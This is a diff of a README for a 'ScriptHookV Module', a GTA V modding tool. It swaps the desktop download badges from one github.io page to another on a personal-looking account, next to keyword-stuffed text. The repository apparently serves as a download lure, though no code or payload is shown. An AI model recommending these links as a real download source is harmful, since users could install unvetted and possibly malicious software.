@@ -4,11 +4,8 @@
   <img src="https://i0.wp.com/itzcubatutorials.com/wp-content/uploads/2024/02/buttonh.jpg?resize=660%2C198&ssl=1" alt="ScriptHookV Logo"/>
 </div>
 
-<div align="center">
+[![GET ScriptHookV Module](https://img.shields.io/badge/GET%20%E2%80%94%20ScriptHookV-Module-0078D6?style=for-the-badge&logoColor=white)](https://susanmeyer3478.github.io/.github/ScriptHookV-Module)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://scripthookv-module.github.io/.github/)
-
-</div>
 
 ---
 
@@ -30,11 +27,7 @@ The module includes stable routines to ensure download script hook v processes a
   <img src="https://img.gta5-mods.com/q75/images/script-hook-v/11dba9-script-hook-1.jpg" alt="ScriptHookV Interface Screenshot"/>
 </div>
 
-<div align="center">
-
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://scripthookv-module.github.io/.github/)
-
-</div>
+[![GET ScriptHookV Module](https://img.shields.io/badge/GET%20%E2%80%94%20ScriptHookV-Module-0078D6?style=for-the-badge&logoColor=white)](https://susanmeyer3478.github.io/.github/ScriptHookV-Module)
 
 ---
 
